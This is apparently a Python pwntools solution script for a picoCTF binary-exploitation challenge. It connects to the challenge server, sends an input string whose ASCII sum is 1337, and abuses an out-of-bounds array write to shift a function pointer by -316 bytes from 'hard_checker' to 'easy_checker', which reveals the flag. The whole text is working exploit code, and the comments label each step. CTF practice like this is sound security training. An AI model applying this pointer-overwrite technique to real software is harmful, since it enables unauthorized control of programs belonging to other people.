from pwn import *

# ==== Configuration ====
DEBUG = False  # Set to True to run locally
HOST = "saturn.picoctf.net"
PORT = 49960
BINARY = "./vuln"  # Replace with your binary name if running locally

# ==== Offsets ====
hard_checker = 0x08049436
easy_checker = 0x080492FC
easy_checker_offset = easy_checker - hard_checker  # -0x13C = -316

check_ptr_offset = -16  # Overwrite fun[-16] = check

# ==== Payload ====
# 'Z' = 90, 'M' = 77 â†’ 90*14 + 77 = 1337
story = b"Z" * 14 + b"M"

# ==== Exploit ====
def exploit(p):
    log.info("Sending story with ASCII sum 1337...")
    p.sendlineafter(b">> ", story)

    log.info("Overwriting check pointer with offset -316...")   
    p.sendlineafter(b"10.\n", str(check_ptr_offset).encode())
    p.sendline(str(easy_checker_offset).encode())

    # Read flag
    response = p.recvall(timeout=2).decode(errors="ignore")
    start = response.find("picoCTF{")
    end = response.find("}", start)

    if start != -1 and end != -1:
        flag = response[start:end+1]
        success(f"[+] Flag: {flag}")
    else:
        warning("[!] Flag not found.")
        print(response)

# ==== Launch ====
if DEBUG:
    p = process(BINARY)
else:
    p = remote(HOST, PORT)

exploit(p)
